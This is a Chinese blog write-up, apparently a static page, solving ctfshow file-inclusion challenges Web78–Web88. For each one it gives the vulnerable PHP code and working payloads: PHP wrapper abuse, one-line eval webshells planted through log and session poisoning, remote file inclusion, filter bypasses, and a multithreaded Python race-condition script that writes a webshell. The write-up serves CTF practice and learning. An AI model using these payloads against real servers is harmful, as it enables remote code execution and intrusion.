@@ -1,0 +1,387 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>ctfshow文件包含 | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>ctfshow文件包含</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/12
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>参考wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_@include($file);-CSDN博客</a>（感谢大佬）</p>
+<h4 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的伪协议读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>之后base64解码即可</p>
+<p>wp中还有一种方法</p>
+<p>使用bp抓包</p>
+<p>给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210904223619186.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+<h4 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题算是过滤了php，所以我们是用不了php协议读取了，这里同样有两种方法</p>
+<p>方法一：</p>
+<p>继续使用bp进行读取，但是所传协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php:input//</span><br><span class="line">改为</span><br><span class="line">Php:input//</span><br></pre></td></tr></table></figure>
+
+<p>也就是说是大小写绕过</p>
+<p>方法二：</p>
+<p>使用data伪协议</p>
+<p>这里有两种方法，一种是</p>
+<p>使用???代替php</p>
+<p>一种是将所执行命令以base64的形式上传之后通过读取方式转化为普通语句</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;</span><br><span class="line">或</span><br><span class="line">?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=(&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;)</span><br><span class="line"></span><br><span class="line">注：data://可以用data:代替</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把data ban了</p>
+<p>emm</p>
+<p>所以上一题的方法一依旧能打</p>
+<p>而这道题重点在方法二</p>
+<p><strong>文件日志包含</strong></p>
+<p>这个Linux的nginx日志文件路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，要在用文件包含漏洞读取日志文件的同时，修改User-Agent头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码</p>
+<p>且操作一定不能出问题，如果报错就要销毁容器从头再来 </p>
+<p>因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。</p>
+<p>所以先修改User-Agent头的value为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后再通过post传参读取</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240612215427081.png" alt="image-20240612215427081"></p>
+<p>flag在查看源码里</p>
+<p>还有一中方法</p>
+<p><strong>远程文件包含</strong></p>
+<p>远程文件包含可以包含其他主机上的文件，并当成php代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?file=http://***.***.***.***/1.txt    </span><br><span class="line"></span><br><span class="line">1.txt里面写入代码。</span><br></pre></td></tr></table></figure>
+
+<p>就是上传一个包含了攻击代码的文本</p>
+<h4 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了:</p>
+<p>。。。</p>
+<p>大小写绕过和远程文件包含都不行了</p>
+<p>只能使用我们的日志包含（日志中的无过滤）</p>
+<h4 id="Web82"><a href="#Web82" class="headerlink" title="Web82"></a>Web82</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将.过滤了，所以日志包含也不能使用了！</p>
+<p>天要亡我啊！！！</p>
+<p>所以我们要在想想怎么包含</p>
+<p>看了大佬的wp发现了新方法</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131955299.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131956765.png" alt="img"></p>
+<p>所以我们的思路答题如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、首先post一个和ini中设置的session.upload_progerss.name同名变量（默认为&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;），之后就会返回上传文件的实时进度并写入session文件中。session文件的内容为：（在$_SESSION中添加一组数据，索引为可以将session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）</span><br><span class="line">二、在post传递PHP_SESSIOM_UPLOAD一句话木马，同时在cookie中设置名字：PHPSESSID，值：flag方便知道实时进度</span><br><span class="line">三、tem/sess_flag文件的内容会变为upload_progress_(一句话木马)</span><br><span class="line">四、完成以上步骤，include(tem/sess_flag)就会执行一句话木马中的php代码</span><br><span class="line">五、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p>
+<p>同时Linux系统中，session文件一般的默认存储位置为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> /var/lib/php/session</span><br><span class="line"></span><br><span class="line">/var/lib/php</span><br><span class="line"></span><br><span class="line">/var/lib/php/sessions</span><br><span class="line"></span><br><span class="line">/tmp/</span><br><span class="line"></span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure>
+
+<p>本题型一律采用&#x2F;tmp形式</p>
+<p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的，一旦读取了所有POST数据，它就会清除进度信息，把我们session文件里的内容全部删除。所以这里我们需要利用条件竞争来读取session文件。</p>
+<p>所以方法一：</p>
+<p>通过bp手动爆破</p>
+<p>先构造一个上传文件的页面，对环境上传一个任意的文件，内容任意，并进行抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;https://6d5c5e02-3874-48cb-84ca-a82fad3d515b.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改上传的文件包</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132033438.png" alt="image-20240613203330399"></p>
+<p> 注意两点：</p>
+<p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p>
+<p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）</p>
+<p>之后包含session文件并且抓包</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132033959.png" alt="image-20240613203346930"></p>
+<p>进行爆破</p>
+<p>将两个项目payload设置如下</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406132036273.png" alt="image-20240613203603243"></p>
+<p>开始爆破</p>
+<p>最后将ls改为tac fl0g.php即可</p>
+<p>或方法二：</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url=&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span><br><span class="line">#设置PHPSESSID的值</span><br><span class="line">sessionid=&#x27;ctfshow&#x27;     </span><br><span class="line">data=&#123;&quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#为了进行条件竞争，需要一边写一边读</span><br><span class="line"> </span><br><span class="line">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span><br><span class="line">def write(session):</span><br><span class="line">	fileBytes = io.BytesIO(b&#x27;a&#x27;*1024*50)          #生产一个50k的文件</span><br><span class="line">	while True:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&#125;,</span><br><span class="line">			cookies=&#123;&#x27;PHPSESSID&#x27;:sessionid&#125;,</span><br><span class="line">			files=&#123;&#x27;file&#x27;:(&#x27;ctfshow.jpg&#x27;,fileBytes)&#125;    #设置文件名字和内容</span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#读取session文件，这里文件为/tmp/sess_ctfshow</span><br><span class="line"> </span><br><span class="line">def read(session):</span><br><span class="line">	while True:</span><br><span class="line">		response=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+&#x27;tao.php&#x27;);</span><br><span class="line">		if response2.status_code==200:</span><br><span class="line">			print(&#x27;++++++++++++++++++++&#x27;)</span><br><span class="line">		else:</span><br><span class="line">			print(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line"> </span><br><span class="line">	#开启多线程进行竞争	</span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	with requests.session() as session:			</span><br><span class="line">		for i in range(20):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		for i in range(20):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.set()</span><br></pre></td></tr></table></figure>
+
+<p>出现+号后然后访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’); </p>
+<h4 id="Web83"><a href="#Web83" class="headerlink" title="Web83"></a>Web83</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session</span><br><span class="line"> in /var/www/html/index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"> </span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题多了两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_unset()：</span><br><span class="line">释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session_id</span><br><span class="line"></span><br><span class="line">session_destroy()：</span><br><span class="line">删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留， 也不会重置会话 cookie</span><br></pre></td></tr></table></figure>
+
+<p>所以我们的session没用了？</p>
+<p>不是这样的，依旧可以进行文件包含</p>
+<p>原因如下（多线程竞争的含义）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</span><br><span class="line"></span><br><span class="line">数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</span><br><span class="line"></span><br><span class="line">这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</span><br></pre></td></tr></table></figure>
+
+<p>所以本题还是和上一题相同的方法</p>
+<h4 id="Web84"><a href="#Web84" class="headerlink" title="Web84"></a>Web84</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>删除了&#x2F;tem&#x2F;下面所有的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f：强制删除文件或目录；</span><br><span class="line">-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</span><br></pre></td></tr></table></figure>
+
+<p>但是</p>
+<p>和上一题一样，由于多线程竞争，所以我们可以进行session文件包含</p>
+<p>方法和前一样</p>
+<h4 id="Web85"><a href="#Web85" class="headerlink" title="Web85"></a>Web85</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p>
+<p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p>
+<p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p>
+<p>但是依旧和前几题一样的方法和理解</p>
+<p>因为被删除了文件之后另一个线程又设置好了session文件。所以还是能包含进去</p>
+<h4 id="Web86"><a href="#Web86" class="headerlink" title="Web86"></a>Web86</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">define(&#x27;还要秀？&#x27;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>define — 定义一个常量</p>
+<p>dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.’），表示当前目录。否则返回的是把 path 中结尾的&#x2F;component（最后一个斜线以及后面部分）去掉之后的字符串。</p>
+<p>set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。</p>
+<p>include</p>
+<p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。</p>
+<p>如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix&#x2F;Linux 下以 &#x2F; 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ..&#x2F; 开头，则解析器会在当前目录的父目录下寻找该文件。</p>
+<p>方法依旧和前几题一样</p>
+<h4 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>…也就是说如果写一点东西进文件，就会先执行死亡函数…</p>
+<p>PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）</p>
+<p>且，解码时，四个字节为一组</p>
+<p>所以我们通过base64解码之后就只有phpdie，我们可以添加两个字符组合解码，抹掉死亡函数</p>
+<p>同时file参数需要url解码，所以我们需要进行两次url解码（get传参要执行一次）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>
+
+<p>需要全编码，防止php被过滤</p>
+<p>所以我们对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行base64编码</p>
+<p>为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure>
+
+<p>但是+会被当作空格处理并在base64解码的时候被忽略，且自动加上一个&#x3D;</p>
+<p>所以我们将+进行url编码%2B</p>
+<p>最后访问1.php</p>
+<p>post输入1&#x3D;system(‘tac fl0g.php’);</p>
+<p>所以这道题的思路就是，先通过web82的方法得到文件，之后创建一个新文件，并写入所需代码</p>
+<p>之后访问1.php 并再post里输入执行的代码即可</p>
+<h4 id="Web88"><a href="#Web88" class="headerlink" title="Web88"></a>Web88</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以直接使用data协议查看</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz54eHh4</span><br><span class="line">//&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;xxxx</span><br></pre></td></tr></table></figure>
+
+<p>后面加xxxx是为了不让base64出现&#x3D;</p>
